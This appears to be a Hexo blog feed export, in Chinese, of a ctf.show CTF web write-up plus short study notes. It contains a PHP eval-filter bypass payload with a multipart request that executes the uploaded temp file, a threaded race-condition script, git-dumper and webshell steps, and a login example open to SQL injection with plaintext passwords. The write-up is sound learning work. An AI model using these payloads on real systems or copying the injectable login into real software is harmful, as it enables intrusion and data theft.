class="line">&lt;html lang=&quot;zh-CN&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot; /&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width  minimum-scale=1.0  maximum-scale=1.0  initial-scale=1.0&quot; /&gt;</span><br><span class="line">    &lt;title&gt;ctf.show_红包题&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;center&gt;</span><br><span class="line">    &lt;h2&gt;ctf.show_红包题&lt;/h2&gt;</span><br><span class="line">    &lt;h4&gt;where is the flag?&lt;/h4&gt;</span><br><span class="line">    &lt;/center&gt;</span><br><span class="line">    &lt;!-- hint:?cmd= --&gt;</span><br><span class="line">    &lt;?php</span><br><span class="line">        if(isset($_GET[&#x27;cmd&#x27;]))&#123;</span><br><span class="line">            $cmd=$_GET[&#x27;cmd&#x27;];</span><br><span class="line">            highlight_file(__FILE__);</span><br><span class="line">            if(preg_match(&quot;/[A-Za-oq-z0-9$]+/&quot;,$cmd))&#123;</span><br><span class="line">            </span><br><span class="line">                die(&quot;cerror&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            if(preg_match(&quot;/\~|\!|\@|\#|\%|\^|\&amp;|\*|\(|\)|\（|\）|\-|\_|\&#123;|\&#125;|\[|\]|\&#x27;|\&quot;|\:|\,/&quot;,$cmd))&#123;</span><br><span class="line">                die(&quot;serror&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            eval($cmd);</span><br><span class="line">        </span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">     ?&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol><li><p>PHP上传机制：</p><p>在php中，使用<code>Content-Type: multipart/form-data;</code>上传文件时，会将它保存在临时文件中，在php的配置中<code>upload_tmp_dir</code>参数为保存临时文件的路经，linux下面默认为<code>/tmp</code>。也就是说只要php接收上传请求，就会生成一个临时文件。如果具有上传功能，那么会将这个文件拷走储存。无论如何在执行结束后这个文件会被删除。并且php每次创建的临时文件名都有固定的格式，为phpXXXX.tmp（Windows中）、php**.tmp（Linux中）。</p></li><li><p>PHP中反引号作用：在php里面反引号里面的内容会被当做shell命令被执行。例如<?php echo`whoami`; ?> 会直接当作命令执行</p></li><li><p><code>.</code>号相当于<code>source</code>命令，这个命令可以直接把文件内容当作命令执行，相当于把文件直接当作shell脚本执行</p></li><li><p><code>&lt;?=</code>相当于<code>&lt;?php ehco</code>的简写版</p></li><li><p><code>?</code>相当于字符的通配符，负责执行上传的临时文件，&#x2F;??p&#x2F;p?p??????匹配&#x2F;tmp&#x2F;phpxxxxxx</p></li><li><p>payload构造</p><blockquote><p>&#x2F;?cmd&#x3D;?&gt;&lt;?&#x3D;<code>.+/??p/p?p??????</code>;</p></blockquote><p><code>?&gt;</code>：闭合前面的<code>&lt;?php</code>命令</p><p><code>&lt;?=</code>：相当于<code>&lt;?php echo</code></p><p>反引号:执行命令</p><p><code>.</code>相当于<code>source</code>命令</p><p><code>+</code>：相当于空格</p><p><code>?</code>：文字通配符</p></li><li><p>构造数据包</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">POST /?cmd=?&gt;&lt;?=`.+/??p/p?p??????`; HTTP/1.1</span><br><span class="line">Host: 6d22af06-d619-447d-a81b-425a21e9ccb5.challenge.ctf.show</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Sec-Ch-Ua: &quot;Not)A;Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;138&quot;, &quot;Google Chrome&quot;;v=&quot;138&quot;</span><br><span class="line">Sec-Ch-Ua-Mobile: ?0</span><br><span class="line">Sec-Ch-Ua-Platform: &quot;Windows&quot;</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Referer: https://6d22af06-d619-447d-a81b-425a21e9ccb5.challenge.ctf.show/</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Priority: u=0, i</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------10242300956292313528205888</span><br><span class="line">Content-Length: 243</span><br><span class="line"></span><br><span class="line">-----------------------------10242300956292313528205888</span><br><span class="line">Content-Disposition: form-data; name=&quot;fileUpload&quot;; filename=&quot;1.txt&quot;</span><br><span class="line">Content-Type: text/plain</span><br><span class="line"><span class="meta prompt_"> </span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">! /bin/sh</span></span><br><span class="line"></span><br><span class="line">cat /flag.txt</span><br><span class="line">-----------------------------10242300956292313528205888--</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>Content-Type有两个值</code>:</p><ol><li>application&#x2F;x-www-form-urlencoded(默认值) ：上传键值对</li><li>multipart&#x2F;form-data：上传文件</li></ol><p><code>boundary=</code>:boundary定义边界符  <strong>multipart&#x2F;form-data 格式的分隔符</strong>，核心作用是<strong>区分上传的多个表单数据块（如文件、普通表单字段）</strong>，避免不同数据内容混淆。</p><p>文件开始标记：—————————–10242300956292313528205888<br>文件结束标记：—————————–10242300956292313528205888–<br>其中10242300956292313528205888是浏览器随机生成的，只要足够复杂就可以。</p><p><code>#! /bin/bash</code>#! &#x2F;bin&#x2F;sh 指定命令解释器，#!是一个特殊的表示符，其后，跟着解释此脚本的shell路径。bash只是shell的一种，还有很多其它shell，如：sh,csh,ksh,tcsh</p><p><code>cat /flag.txt</code>执行命令得到flag（先ls &#x2F; 看看根目录，发现有flag.txt）</p></li></ol><p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251118235305477.png" alt="image-20251118235305477"></p><p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251118235342177.png" alt="image-20251118235342177"></p><h2 id="红包第六弹"><a href="#红包第六弹" class="headerlink" title="红包第六弹"></a>红包第六弹</h2><p>dirsearch扫描目录</p><p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251119224834780.png" alt="image-20251119224834780"></p><p><code>/web.zip</code>得到源码</p><p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251119225321166.png" alt="image-20251119225321166"></p><p>通过源码发现key.dat文件，尝试下载</p><p>参考脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">import hashlib</span><br><span class="line">import threading</span><br><span class="line"></span><br><span class="line">#这里为什么用分钟数生成：因为通过抓包发现改变分钟后token值才会变化</span><br><span class="line">i=str(time.localtime().tm_min)</span><br><span class="line">#生成token</span><br><span class="line">m=hashlib.md5(i.encode()).hexdigest()</span><br><span class="line">url=&quot;http://bdedf572-c2a4-41ff-966d-3cb094d5eabb.challenge.ctf.show/check.php?token=&#123;&#125;&amp;php://input&quot;.format(m)</span><br><span class="line"></span><br><span class="line">def POST(data):</span><br><span class="line">    try:</span><br><span class="line">        r=requests.post(url,data=data)</span><br><span class="line">        if &quot;ctfshow&quot; in r.text:</span><br><span class="line">            print(r.text)</span><br><span class="line">            pass</span><br><span class="line">        # print(r.text)</span><br><span class="line">        pass</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(&quot;somthing went wrong!&quot;)</span><br><span class="line">        pass</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">with open(&#x27;key.dat&#x27;,&#x27;rb&#x27;) as t:</span><br><span class="line">    data1=t.read()</span><br><span class="line">    pass</span><br><span class="line">for i in range(50):</span><br><span class="line">    threading.Thread(target=POST,args=(data1,)).start()</span><br><span class="line">for i in range(50):</span><br><span class="line">    data2=&#x27;emmmmm&#x27;</span><br><span class="line">    threading.Thread(target=POST,args=(data2,)).start()</span><br></pre></td></tr></table></figure><h4 id="攻击原理流程："><a href="#攻击原理流程：" class="headerlink" title="攻击原理流程："></a>攻击原理流程：</h4><ol><li><strong>第一次请求</strong>（发送key.dat内容）：<ul><li>系统接收数据并保存为flag.dat</li><li>此时：flag.dat内容 &#x3D; key.dat内容</li><li>MD5相同，但SHA512也相同（因为内容相同）</li><li>不满足”SHA512不同”的条件</li></ul></li><li><strong>第二次请求</strong>（发送简单字符串）：<ul><li>系统接收数据并<strong>覆盖</strong>flag.dat</li><li>此时：flag.dat内容 &#x3D; “emmmmm”</li><li>MD5不同（因为内容不同），不满足”MD5相同”条件</li></ul></li></ol><h4 id="关键：并发攻击的时间窗口"><a href="#关键：并发攻击的时间窗口" class="headerlink" title="关键：并发攻击的时间窗口"></a>关键：并发攻击的时间窗口</h4><p>通过并发发送大量请求，攻击者利用了一个<strong>时间窗口</strong>：</p><ol><li>在极短时间内，第一个请求使flag.dat等于key.dat内容（满足MD5相同）</li><li>紧接着，第二个请求使flag.dat变为”emmmmm”内容（MD5不同）</li><li><strong>但在验证过程中</strong>，系统可能在不同时间点读取flag.dat：<ul><li>读取MD5时：flag.dat还是key.dat内容（MD5相同）</li><li>读取SHA512时：flag.dat已经变成”emmmmm”内容（SHA512不同）</li></ul></li></ol><h4 id="为什么要发送50次？"><a href="#为什么要发送50次？" class="headerlink" title="为什么要发送50次？"></a>为什么要发送50次？</h4><h4 id="增加成功率的策略："><a href="#增加成功率的策略：" class="headerlink" title="增加成功率的策略："></a>增加成功率的策略：</h4><ol><li><strong>时间窗口很小</strong>：需要在系统处理的极短时间内完成两次文件写入</li><li><strong>并发增加机会</strong>：50个线程并发执行，增加在正确时间窗口内命中的概率</li><li><strong>容错机制</strong>：网络延迟、服务器处理速度等因素可能导致单次请求失败</li></ol><h2 id="红包题第七弹"><a href="#红包题第七弹" class="headerlink" title="红包题第七弹"></a>红包题第七弹</h2><p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/20251120223503982.png" alt="image-20251120214432028"></p><p>打开<code>/backdoor.php</code></p><p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/20251120223503983.png" alt="image-20251120214616786"></p><p><code>git-dumper https://17624533-04d3-43fa-af1d-8b99f4d0b05e.challenge.ctf.show/.git ./output</code></p><p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/20251120223503984.png" alt="image-20251120220853221"></p><p>用蚁剑连接</p><p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/20251120223503985.png" alt="image-20251120221235310"></p><p>不能直接查看flag.txt</p><p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/20251120223503986.png" alt="image-20251120221335715"></p><p>POST传参<code>Letmein=highlight_file(&quot;../flag.txt&quot;);</code></p><p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/20251120223503987.png" alt="image-20251120221905487"></p><h2 id="萌新专属红包题"><a href="#萌新专属红包题" class="headerlink" title="萌新专属红包题"></a>萌新专属红包题</h2><p>弱口令</p><p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/20251120223503988.png" alt="image-20251120222955518"></p><p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/20251120223503989.png" alt="image-20251120223027976"></p><p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/20251120223503990.png" alt="image-20251120223450461"></p><h2 id="CTFshow-web1"><a href="#CTFshow-web1" class="headerlink" title="CTFshow web1"></a>CTFshow web1</h2><p>注册登录</p><p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/20251120225424837.png" alt="image-20251120225416475"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>picgo_test</title>
      <link href="/2025/10/08/picgo-test/"/>
      <url>/2025/10/08/picgo-test/</url>
      
        <content type="html"><![CDATA[<p>项目地址：<a href="https://github.com/Molunerfinn/PicGo">https://github.com/Molunerfinn/PicGo</a></p><p>两张图片：<br><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/640.jpg" style="zoom: 25%;" /><br><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/640%20(1).jpg" style="zoom: 25%;" /></p><p>typora上传:<br><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/%E7%94%B5%E6%A3%8D.jpg" alt="电棍"></p>]]></content>
      
      
      <categories>
          
          <category> 杂 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> test </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web任务</title>
      <link href="/2025/09/29/web%E4%BB%BB%E5%8A%A1/"/>
      <url>/2025/09/29/web%E4%BB%BB%E5%8A%A1/</url>
      
        <content type="html"><![CDATA[<h2>任务一</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /api/graphs/fulltext-search?haha=123 HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">Cookie: xxx=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,</span><br><span class="line">like Gecko) Chrome/140.0.0.0 Safari/537.36 Edg/140.0.0.0</span><br><span class="line">Sec-Ch-Ua: &quot;Chromium&quot;;v=&quot;140&quot;, &quot;Not=A?Brand&quot;;v=&quot;24&quot;, &quot;Microsoft Edge&quot;;v=&quot;140&quot;</span><br><span class="line">Sec-Ch-Ua-Mobile: ?0</span><br><span class="line">Accept: text/html</span><br><span class="line">Referer: https://osgraph.com/</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 26</span><br><span class="line">indexName=github&amp;keyword=1</span><br></pre></td></tr></table></figure><h3>请求行：</h3><p><code>POST /api/graphs/fulltext-search?haha=123 HTTP/1.1</code></p><h3>请求体：</h3><p><code>indexName=github&amp;keyword=1</code></p><p>从github索引库搜索关键词 1</p><h2>任务二</h2><h3>php</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// login.php</span></span><br><span class="line"><span class="comment">// 纯 PHP 登录示例，使用单独文件的数据库连接</span></span><br><span class="line"><span class="comment">// 引入数据库连接</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;db.php&#x27;</span>;</span><br><span class="line"><span class="comment">// 模拟接收表单数据（CLI 或 Web POST）</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">php_sapi_name</span>() === <span class="string">&#x27;cli&#x27;</span>) &#123;</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&quot;请输入用户名: &quot;</span>;</span><br><span class="line"> <span class="variable">$username</span> = <span class="title function_ invoke__">trim</span>(<span class="title function_ invoke__">fgets</span>(STDIN));</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&quot;请输入密码: &quot;</span>;</span><br><span class="line"> <span class="variable">$password</span> = <span class="title function_ invoke__">trim</span>(<span class="title function_ invoke__">fgets</span>(STDIN));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"> <span class="variable">$username</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>);</span><br><span class="line"> <span class="variable">$password</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 检查输入</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$username</span> === <span class="string">&quot;&quot;</span> || <span class="variable">$password</span> === <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&quot;用户名和密码不能为空\n&quot;</span>;</span><br><span class="line"> <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 查询数据库（明文密码示例）</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users WHERE username=&#x27;<span class="subst">$username</span>&#x27; AND password=&#x27;<span class="subst">$password</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$result</span> &amp;&amp; <span class="variable">$result</span>-&gt;num_rows &gt; <span class="number">0</span>) &#123;</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&quot;登录成功！欢迎你，<span class="subst">$username</span>\n&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&quot;用户名或密码错误\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 关闭数据库</span></span><br><span class="line"><span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">CREATE DATABASE test;</span><br><span class="line">USE test;</span><br><span class="line">CREATE TABLE <span class="title function_ invoke__">users</span> (</span><br><span class="line"> id INT AUTO_INCREMENT PRIMARY KEY,</span><br><span class="line"> username <span class="title function_ invoke__">VARCHAR</span>(<span class="number">50</span>),</span><br><span class="line"> password <span class="title function_ invoke__">VARCHAR</span>(<span class="number">50</span>)</span><br><span class="line">);</span><br><span class="line">INSERT INTO <span class="title function_ invoke__">users</span> (username, password) <span class="title function_ invoke__">VALUES</span> (<span class="string">&#x27;alice&#x27;</span>, <span class="string">&#x27;12345&#x27;</span>);</span><br><span class="line">INSERT INTO <span class="title function_ invoke__">users</span> (username, password) <span class="title function_ invoke__">VALUES</span> (<span class="string">&#x27;bob&#x27;</span>, <span class="string">&#x27;abcde&#x27;</span>);</span><br></pre></td></tr></table></figure><p>登陆系统</p><h3>html</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- login.html --&gt;</span></span><br><span class="line"><span class="meta">&lt;!doctype <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">title</span>&gt;</span>Login<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">h3</span>&gt;</span>登录<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;/login.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">label</span>&gt;</span>用户名: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> /&gt;</span><span class="tag">&lt;/<span class="name">label</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">label</span>&gt;</span>密码: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> /&gt;</span><span class="tag">&lt;/<span class="name">label</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span>登录<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- upload.html --&gt;</span></span><br><span class="line"><span class="meta">&lt;!doctype <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">h3</span>&gt;</span>上传文件<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;/upload.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span>上传<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>登录界面，以及上传文件</p><h2>任务三</h2><h3>less 1</h3><p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/PixPin_2025-09-30_00-28-00.png" alt="PixPin_2025-09-30_00-28-00"></p><h3>less 5</h3><p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/PixPin_2025-09-30_00-42-16.png" alt="PixPin_2025-09-30_00-38-13"></p><h3>less11</h3><p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/PixPin_2025-09-30_00-44-35.png" alt="PixPin_2025-09-30_00-44-35"></p>]]></content>
      
      
      <categories>
          
          <category> 杂 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 杂 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基础任务</title>
      <link href="/2025/09/29/%E5%9F%BA%E7%A1%80%E4%BB%BB%E5%8A%A1/"/>
      <url>/2025/09/29/%E5%9F%BA%E7%A1%80%E4%BB%BB%E5%8A%A1/</url>
      
        <content type="html"><![CDATA[<h2><strong>计算机教育中缺失的学期</strong></h2><p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/PixPin_2025-09-29_23-43-13.png" alt="PixPin_2025-09-29_23-43-13"></p><h2>访问chatGPT</h2><p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/PixPin_2025-09-29_23-06-34.png" alt="PixPin_2025-09-29_23-06-34"></p><h2>搭建博客</h2><p>搭建基于 github+hexo 的个人博客，在部署到github时，因网络而失败，后面通过切换代理解决。</p><h2>安装虚拟机</h2><h4>ubuntu22.04</h4><p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/PixPin_2025-09-29_23-20-21.png" alt="PixPin_2025-09-29_23-20-21"></p><h4>kali</h4><p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/PixPin_2025-09-29_23-19-26.png" alt="PixPin_2025-09-29_23-19-26"></p><h2>使用VScode</h2><h4>Hello World</h4><p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/PixPin_2025-09-29_23-29-55.png" alt="PixPin_2025-09-29_23-29-55"></p><h4>SSH连接虚拟机</h4><p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/PixPin_2025-09-29_23-32-11.png" alt="PixPin_2025-09-29_23-32-11"></p><h4>主题插件<img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/PixPin_2025-09-29_23-33-16.png" alt="PixPin_2025-09-29_23-33-16"></h4><h4>安装 libnum库,并运行代码</h4><h5>安装</h5><p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/PixPin_2025-09-29_23-39-27.png" alt="PixPin_2025-09-29_23-39-27"></p><h5>运行代码</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line">my_str = <span class="number">10400874617859432610723437735825230748786977</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(my_str))</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/PixPin_2025-09-29_23-39-44.png" alt="PixPin_2025-09-29_23-39-44"></p>]]></content>
      
      
      <categories>
          
          <category> 杂 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 杂 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2024/11/07/hello-world/"/>
      <url>/2024/11/07/hello-world/</url>
      
